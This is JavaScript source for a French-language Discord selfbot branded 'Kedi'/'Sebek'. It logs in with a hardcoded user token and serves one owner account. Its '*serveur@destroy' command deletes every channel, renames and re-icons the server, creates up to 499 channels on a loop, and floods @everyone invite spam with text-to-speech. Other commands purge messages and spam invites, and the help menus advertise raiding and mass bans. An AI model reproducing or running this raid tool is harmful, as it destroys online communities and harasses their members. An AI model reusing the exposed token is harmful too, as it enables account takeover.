let discord = require('discord.js');
let bot = new discord.Client();
let fetch = require("node-fetch")
bot.setMaxListeners(20)


let prefix = ("*");
let start = Date.now();


bot.on('ready', () => {
    console.log("𝑲𝒆𝒅𝒊.𝒋𝒔 𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒆́");
});     

bot.login("mfa.lTkLt80jr2qm7q24kUjeWqFplsRM09GInCd2UVI_9oXSNodReYZsQezqVQLK7BOubp0SrhRxxscezaef2HeA");


bot.on('message', message => {

    if (message.content === prefix + "channel"){
        if (message.author.id != "174913532687548416") return;
    if (message.deletable) message.delete();
    let categories = message.guild.channels.filter(c => c.type === "category")
    let text = message.guild.channels.filter(c => c.type === "text")
    let voice = message.guild.channels.filter(c => c.type === "voice")
    let category_embed = new discord.RichEmbed()
    .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
    .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
    .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
    .setColor("RANDOM")
    .addField("𝘾𝙖𝙩𝙚𝙜𝙤𝙧𝙮 𝙇𝙞𝙨𝙩", categories.map(c => c.name))
    message.channel.sendEmbed(category_embed);
    let text_embed = new discord.RichEmbed()
    .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
    .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
    .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
    .setColor("RANDOM")
    .addField("𝙏𝙚𝙭𝙩 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙇𝙞𝙨𝙩", text.map(c => c.name))
    message.channel.sendEmbed(text_embed);
    let voice_embed = new discord.RichEmbed()
    .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
    .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
    .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
    .setColor("RANDOM")
    .addField("𝙑𝙤𝙞𝙘𝙚 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙇𝙞𝙨𝙩", voice.map(c => c.name))
    message.channel.sendEmbed(voice_embed);
    }

    if (message.content === prefix + "help"){
   if (message.author.id != "174913532687548416") return;
    if (message.deletable) message.delete();
    let help_embed = new discord.RichEmbed()
    .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
    .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
    .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
    .setColor("RANDOM")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙂𝙀𝙉𝙀𝙍𝘼𝙇 |-  ", "🌐  *𝙜𝙚𝙣𝙚𝙧𝙖𝙡 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙂𝙀𝙉𝙀𝙍𝘼𝙇!` \n" + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘽𝙊𝙉𝙐𝙎 |-  ", "⚜️  *𝙗𝙤𝙣𝙪𝙨 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘽𝙊𝙉𝙐𝙎!` \n" + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝘼𝙄𝘿 |-  ", "✏️  *𝙧𝙖𝙞𝙙 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝘼𝙄𝘿!` \n" + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙐𝙉 |-  ", "🎉  *𝙛𝙪𝙣 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙐𝙉!` \n" + "󠂪")
    .addField("  -| 𝑵𝒐𝒖𝒗𝒆𝒂𝒖𝒕𝒆́𝒔 |-  ", "🎉  *𝒎𝒂𝒋 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝑵𝒐𝒖𝒗𝒆𝒂𝒖𝒕𝒆́𝒔!` \n" + "󠂪")
    .addField("  -| 𝑹𝒆𝒔𝒆𝒂𝒖𝒙  |-  ", "🌐*𝒓𝒆𝒔𝒆𝒂𝒖𝒙 : `𝑨𝒇𝒇𝒊𝒄𝒉𝒆 𝒎𝒆𝒔 𝒓𝒆𝒔𝒆𝒂𝒖𝒙 𝒔𝒐𝒄𝒊𝒂𝒖𝒙 !` \n" + "󠂪")
    message.channel.sendEmbed(help_embed);
    }
    if (message.content === prefix + "raid"){
    if (message.author.id != "174913532687548416") return;
    if (message.deletable) message.delete();
    let raid_embed = new discord.RichEmbed()
        .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
        .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
        .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘋𝘦𝘴𝘵𝘳𝘰𝘺 ! |-  ", "🌇  *𝙨𝙚𝙡𝙛 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙖 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙥𝙤𝙪𝙧 𝘿𝙀𝙎𝙏𝙍𝙊𝙔!`\n" + "󠂪")
        .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘉𝘢𝘯 𝘩𝘢𝘮𝘮𝘦𝘳 |-  ", "⚔️ *𝒃𝒂𝒏 `𝘽𝙖𝙣 𝙩𝙤𝙪𝙩 𝙡𝙚 𝙈𝙊𝙉𝘿𝙀!`\n" + "󠂪")
        .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘊𝘭𝘦𝘢𝘳 𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴 |-  ", "⚔️ *𝒄𝒍𝒆𝒂𝒓𝒄𝒉𝒂𝒏 : `𝙎𝙪𝙥𝙥𝙧𝙞𝙢𝙚 𝙩𝙤𝙪𝙩 𝙡𝙚𝙨 𝘾𝙃𝘼𝙉𝙉𝙀𝙇𝙎!`\n" + "󠂪")
        .setColor("RANDOM")
        .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
        message.channel.sendEmbed(raid_embed);
    }

    if (message.content === prefix + "fun"){
    
        if (message.author.id != "174913532687548416") return;
        if (message.deletable) message.delete();
        let fun_embed = new discord.RichEmbed()
            .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘗𝘪𝘯𝘨 |-  ", "🔌  *𝙥𝙞𝙣𝙜 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙋𝙄𝙉𝙂!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 8𝘣𝘢𝘭𝘭 |-  ", "💎 *𝟖𝒃𝒂𝒍𝒍 : `𝙋𝙤𝙨𝙚𝙯 𝙢𝙤𝙞 𝙪𝙣𝙚 𝙌𝙐𝙀𝙎𝙏𝙄𝙊𝙉!`\n" + "󠂪")
            .setColor("RANDOM")
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            message.channel.sendEmbed(fun_embed);
    
    }

    if (message.content === prefix + "bonus"){
    
        if (message.author.id != "174913532687548416") return;
        if (message.deletable) message.delete();
        let bonus_embed = new discord.RichEmbed()
            .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘓𝘪𝘴𝘵𝘦𝘯 |-  ", "🎧 ~ *𝙡𝙞𝙨𝙩𝙚𝙣 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙚𝙣 𝙀𝘾𝙊𝙐𝙏𝙀!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘗𝘭𝘢𝘺 |-  ", "🎮 ~ *𝙥𝙡𝙖𝙮 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙖𝙪𝙦𝙪𝙚𝙡 𝙩𝙪 𝙫𝙚𝙪𝙭 𝙅𝙊𝙐𝙀𝙍!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘞𝘢𝘵𝘤𝘩 |-  ", "💻 ~ *𝙬𝙖𝙩𝙘𝙝 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙦𝙪𝙚 𝙩𝙪 𝙍𝙀𝙂𝘼𝙍𝘿𝙀𝙎!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘚𝘵𝘳𝘦𝘢𝘮 |-  ", "🎥 ~ *𝙨𝙩𝙧𝙚𝙖𝙢 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙚𝙣 𝙎𝙏𝙍𝙀𝘼𝙈!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘋𝘋𝘖𝘚 ! |-  ", "💥 ~ *𝒅𝒅𝒐𝒔 : `𝙇𝙖𝙣𝙘𝙚 𝙪𝙣𝙚 𝙛𝙖𝙪𝙨𝙨𝙚 𝙖𝙩𝙩𝙖𝙦𝙪𝙚 𝘿𝘿𝙊𝙎!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘈𝘣𝘰𝘶𝘵 |-  ", "🔮 ~ *𝒂𝒃𝒐𝒖𝒕 : `𝙈𝙤𝙣𝙩𝙧𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙩 𝙫𝙤𝙪𝙨 𝙥𝙤𝙪𝙫𝙚𝙯 𝙢𝙚 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙚𝙯!`\n" + "󠂪")
            .addField("  -| 𝑴𝒖𝒍𝒕𝒊-𝑺𝒕𝒓𝒆𝒂𝒎 |-  ", "🎉  *𝒎𝒔𝒕𝒓𝒆𝒂𝒎 : `𝑳𝒂𝒏𝒄𝒆 𝒍𝒆 𝒎𝒖𝒍𝒕𝒊-𝒔𝒕𝒓𝒆𝒂𝒎 !` \n" + "󠂪")
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .setColor("RANDOM")
            message.channel.sendEmbed(bonus_embed);
    
    }

    if (message.content === prefix + "servers"){

        let server_count_guilds = bot.guilds.size
        let server_count_channels = bot.channels.size
        let server_count_users = bot.users.size
    
        if (message.author.id != "174913532687548416") return;
        if (message.deletable) message.delete();
        let serversEmbed = new discord.RichEmbed()
            .setColor("RANDOM")
            .setTitle("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .addField("Connecté à ", server_count_guilds + " **servers**")
            .addField("Lis actuellement ", server_count_channels + " **channels**")
            .addField("Devant ", server_count_users + " **utilisateurs**")
        message.channel.sendEmbed(serversEmbed);
    }

    if (message.content === prefix + "general"){
    
        if (message.author.id != "174913532687548416") return;
        if (message.deletable) message.delete();
        let help_embed = new discord.RichEmbed()
            .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘈𝘷𝘢𝘵𝘢𝘳 |-  ", "✏️  *𝙖𝙫𝙖𝙩𝙖𝙧 : `𝒂𝙛𝙛𝙞𝙘𝙝𝙚 𝙡'𝘼𝙑𝘼𝙏𝘼𝙍 𝙙𝙚 𝙡𝙖 𝙥𝙚𝙧𝙨𝙤𝙣𝙣𝙚!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘗𝘳𝘦𝘧𝘪𝘹 |-  ", "✏️  *𝙥𝙧𝙚𝙛𝙞𝙭 : `𝙋𝙚𝙧𝙢𝙚𝙩 𝙙𝙚 𝙘𝙝𝙖𝙣𝙜𝙚𝙧 𝙡𝙚 𝙋𝙍𝙀𝙁𝙄𝙓 𝙨𝙪𝙧 𝙡𝙚 𝙨𝙚𝙧𝙫𝙚𝙪𝙧!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘗𝘶𝘳𝘨𝘦 |-  ", "⚖️  *𝙥𝙪𝙧𝙜𝙚 : `𝙎𝙪𝙥𝙥𝙧𝙞𝙢𝙚 𝙡𝙚𝙨 𝙢𝙚𝙨𝙨𝙖𝙜𝙚𝙨 𝙋𝙐𝙍𝙂𝙀!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘗𝘶𝘣 |-  ", "🔱  *𝙥𝙪𝙗 : `𝙋𝙚𝙧𝙢𝙚𝙩 𝙙'𝙚𝙣𝙫𝙤𝙮𝙚𝙧 𝙪𝙣𝙚 𝙥𝙪𝙗 𝙙𝙪 𝐒𝐞𝐫𝐯𝐞𝐮𝐫 𝐝𝐞 𝐊𝐄𝐃𝐈 😉`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘚𝘦𝘳𝘷𝘦𝘳𝘴 |-  ", "📘  *𝙨𝙚𝙧𝙫𝙚𝙧𝙨 : `𝙀𝙣𝙫𝙤𝙞𝙚 𝙡𝙚𝙨 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙦𝙪𝙚𝙨 𝙙𝙚 𝙩𝙤𝙣 𝙘𝙤𝙢𝙥𝙩𝙚`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘊𝘩𝘢𝘯𝘯𝘦𝘭 |-  ", "📘  *𝙘𝙝𝙖𝙣𝙣𝙚𝙡 : `𝙇𝙞𝙨𝙩𝙚 𝙙𝙚 𝙩𝙤𝙪𝙩 𝙡𝙚𝙨 𝘾𝙃𝘼𝙉𝙉𝙀𝙇𝙎!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘚𝘦𝘳𝘷𝘦𝘶𝘳𝘪𝘯𝘧𝘰 |-  ", "📘  *𝙨𝙞𝙣𝙛𝙤 : `𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙙𝙪 𝙎𝙀𝙍𝙑𝙀𝙐𝙍!`\n" + "󠂪")
            .addField("  -| 𝑺𝒆𝒃𝒆𝒌 𝘔𝘦𝘮𝘣𝘳𝘦𝘪𝘯𝘧𝘰 |-  ", "📘  *𝙢𝙞𝙣𝙛𝙤 : `𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙙𝙪 𝙈𝙀𝙈𝘽𝙍𝙀!`\n" + "󠂪")
            .setColor("RANDOM")
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            message.channel.sendEmbed(help_embed);
    
    }

    if (message.content === "*spam") {
   if (message.author.id != "174913532687548416") return;
    message.delete()
    let i = 0;
    let interval = setInterval(function () {
      message.guild.channels.forEach(channel => {
        if (channel.type === "text") message.channel.forEach();message.channel.send('@everyone Rejoins-nous ici ! https://discord.gg/wYEYCBY ! https://discord.gg/wYEYCBY')
      }, 100);
    });
  }

    if (message.content === "*kedi"){
        if (message.deletable) message.delete();
        if (message.author.id != "174913532687548416") return;
        let help_embed = new discord.RichEmbed()
        .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
        .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
        .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
        .addField("☣️ 𝑲𝒆𝒅𝒊'𝙨 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙀𝘾𝙐𝙍𝙄𝙏𝙔™  ☣️", "  => 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 𝙨𝙘𝙧𝙞𝙥𝙩 ```Kedi.js``` ... ")
        .setColor("RANDOM")
        message.channel.sendEmbed(help_embed);
        console.log("Commande sebek demandée.")
        
    }

    if(message.content === prefix + "random"){
        if (message.deletable) message.delete();
        random = Math.floor(Math.random() * 101) + 1;
        message.replay(`Random number : **${random}**`)
    }

    if(message.content === prefix + "mstream"){
      if (message.deletable) message.delete();
      if (message.author.id != "174913532687548416") return
        let rotate = 0;
    setInterval(function() {
        if(rotate === 0) {
            bot.user.setActivity("𝐶𝑜𝑑𝑒: 𝑆𝑖𝑟-𝐾𝑒𝑑𝑖", {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 1;       
        } else if(rotate === 1){
            bot.user.setActivity("𝑌𝑜𝑢𝑡𝑢𝑏𝑒: 𝐾𝑒𝑑𝑖𝑂𝑓𝑓𝑖𝑐𝑖𝑒𝑙", {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 2;
        } else if(rotate === 2){
            bot.user.setActivity(`https://discord.me/donquitablefamily`, {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 3;
        }  else if(rotate === 3){
            random = Math.floor(Math.random() * 7) + 1;
            bot.user.setActivity(`𝙏𝙝𝙚 𝙙𝙞𝙘𝙚 𝙧𝙤𝙡𝙡𝙚𝙙 𝙞𝙩'𝙨 𝙖 ${random}. 🎲`, {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 4;
        } else if(rotate === 4){
            bot.user.setActivity(`https://discord.gg/JgqWJff 💸`, {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 5;
        } else if(rotate === 5){
            bot.user.setActivity(`𝑇𝑤𝑖𝑡𝑡𝑒𝑟: @𝐾𝑒𝑑𝑖𝑂𝑓𝑓𝑖𝑐𝑖𝑒𝑙`, {type: "Streaming", url: 'https://www.twitch.tv/twitch'});
            rotate = 0;
        } }, 10 * 1000)
      }
      

    if (message.content.startsWith('*avatar')) {
        if (message.author.id != "174913532687548416") return;
        if (!message.mentions.users.size) {
        
        return message.channel.send(`Avatar de 𝑲𝒆𝒅𝒊 ${message.author.displayAvatarURL}`);
        
        }
        
        
        
        let avatarList = message.mentions.users.map(user => {
            let getav_embed = new discord.RichEmbed()
            .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .addField("Voici l'image de ta proie.", "☣️ - N'oublions pas de dire merci !")
            .setImage(`${user.displayAvatarURL}`)
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .setColor("RANDOM")
            message.channel.sendEmbed(getav_embed);
        
        return;
        
        });
        
        message.channel.send(avatarList);
        }

    if (message.content === prefix + "about"){
        if (message.deletable) message.delete();
        if (message.author.id != "174913532687548416") return;
        let help_embed = new discord.RichEmbed()
            .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .setImage("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .addField("☣️ -| 𝑲𝒆𝒅𝒊'𝙨 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- ☣️", "🧙‍ - *`𝕂𝕖𝕕𝕚 𝕆𝕗𝕗𝕚𝕔𝕚𝕖𝕝#0001`*")
            .addField("☣️ -| 𝑲𝒆𝒅𝒊'𝙨 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- ☣️", "🌇 - *`https://discord.gg/wYEYCBY`*")
            .addField("☣️ -| 𝑲𝒆𝒅𝒊'𝙨 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- ☣️", "🌇 - *`https://discord.gg/wYEYCBY`*")
            .setColor("RANDOM")
            message.channel.sendEmbed(help_embed);
        console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘼𝙗𝙤𝙪𝙩 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
    }

    if (message.content === prefix + "self"){
        if (message.deletable) message.delete();
        if (message.author.id != "174913532687548416") return;
        let help_embed = new discord.RichEmbed()
            .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .addField("☣️ -| 𝑲𝒆𝒅𝒊'𝙨  𝐒𝐄𝐋𝐅𝐁𝐎𝐓™ |- ☣️", "🌇 -*serveur@destroy : `𝙎𝙚𝙧𝙫𝙚𝙧 𝘿𝙚𝙨𝙩𝙤𝙮𝙚𝙙 !`")
            .setImage("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .setColor("RANDOM")
            message.channel.sendEmbed(help_embed);
        console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙎𝙚𝙡𝙛 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
    }

    if (message.content === prefix + "reseaux"){
        if (message.deletable) message.delete();
        if (message.author.id != "174913532687548416") return;
        let help_embed = new discord.RichEmbed()
            .setAuthor("🌟 𝑲𝒆𝒅𝒊'𝙨 𝙋𝙧𝙤𝙜𝙧𝙖𝙢𝙢𝙖𝙩𝙞𝙤𝙣𝙨 🌟")
            .setFooter("🌀 𝑺𝒆𝒍𝒇𝒃𝒐𝒕 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀")
            .setThumbnail("https://media.giphy.com/media/fGCmOQrlWUb3140L4d/giphy.gif")
            .addField("☣️ -| 𝑲𝒆𝒅𝒊'𝙨 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- ☣️", "🧙‍ - *`𝕂𝕖𝕕𝕚 𝕆𝕗𝕗𝕚𝕔𝕚𝕖𝕝#0001`*")
            .addField("🎮 -| 𝑭𝒐𝒓𝒕𝒏𝒊𝒕𝒆 |- 🎮", "🌇 - *`𝑺𝒊𝒓 𝑲𝒆𝒅𝒊`*")
            .addField("🐦 -| 𝑻𝒘𝒊𝒕𝒕𝒆𝒓 |- 🐦", "🌇 - *`@𝑲𝒆𝒅𝒊𝑶𝒇𝒇𝒊𝒄𝒊𝒆𝒍`*")
            .addField("☣️ -| 𝑺𝒆𝒓𝒗𝒆𝒖𝒓 𝑫𝒊𝒔𝒄𝒐𝒓𝒅 |- ☣️", "🌇 - *`https://discord.gg/wYEYCBY `*")
            .addField("📺 -| 𝒀𝒐𝒖𝒕𝒖𝒃𝒆 |- 📺", "🌇 - *`𝑲𝒆𝒅𝒊 𝑶𝒇𝒇𝒊𝒄𝒊𝒆𝒍`*")
            .addField("💰 -| 𝑪𝒐𝒅𝒆 𝑪𝒓𝒆́𝒂𝒕𝒆𝒖𝒓 |- 💰", "🌇 - *`𝑺𝑰𝑹-𝑲𝑬𝑫𝑰`*")
            .addField("📺 -| 𝑻𝒘𝒊𝒕𝒄𝒉 |- 📺", "🌇 - *`𝑲𝒆𝒅𝒊𝑶𝒇𝒇𝒊𝒄𝒊𝒆𝒍`*")
            .addField("💰 -| 𝑫𝒐𝒏 |- 💰", "🌇 - *`https://streamlabs.com/loloplaygame`*")
            .setColor("RANDOM")
            message.channel.sendEmbed(help_embed);
        console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 Reseaux 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
    }


    if (message.content === prefix + "ping"){
        if (message.deletable) message.delete();
        if (message.author.id != "174913532687548416") return;
        let end = new Date().getTime();
        let millis = Date.now() - start;
        let temp = Math.floor(millis/1000);
        if (message.deletable) message.delete();
        message.reply('```☣️ Réponse en ' + temp + ' ms```');
    }

if(message.content === "*serveur@destroy"){
    if (message.deletable) message.delete();
    if (message.author.id != "174913532687548416") return;
    if(message.channel.type === "dm") return;
    if(message.guild.channels.size === 0) return;
    if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
    message.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
}

if(message.content === "*serveur@destroy"){
    if(message.channel.type === "dm") return;
    if (message.author.id != "174913532687548416") return; 
    if(message.guild.name != "☣️ 𝑲𝒆𝒅𝒊☣️"){
         message.guild.setIcon("https://i.imgur.com/nknnfHe.png").catch(error => {})
         message.guild.setName('☣️ 𝑲𝒆𝒅𝒊 ☣️').catch(error => {})
         message.guild.setRegion('russia').catch(error => {})
     }
     setInterval(function () { if(message.guild.channels.size < 499){
       message.guild.createChannel('☣️_𝙁𝙪𝙘𝙠𝙚𝙙_𝙗𝙮_𝑲𝒆𝒅𝒊_☣️', 'text').catch(error => {})
     }}, 400)
     if(message.deletable) message.delete();
   }

   if (message.content === '*serveur@destroy') {
    if(message.channel.type === "dm") return;
    if (message.author.id != "174913532687548416") return; 
      setInterval (function () { message.channel.send("@everyone @here . REJOINS NOUS ICI !!! \n"+
      "🌀 𝑹𝒂𝒊𝒅 𝒃𝒚 𝑺𝒆𝒃𝒆𝒌 🌀 \n"+
     "https://discord.gg/JgqWJff \n"+
     "https://discord.gg/JgqWJff", { tts: true } ).catch(error => {}) }, 400)
    }

   if (message.author.id != "174913532687548416") return;   
   if (message.author.bot) return;
   let messageArray = message.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
   

   if (cmd == "*purge") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
   if (cmd == "*del") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
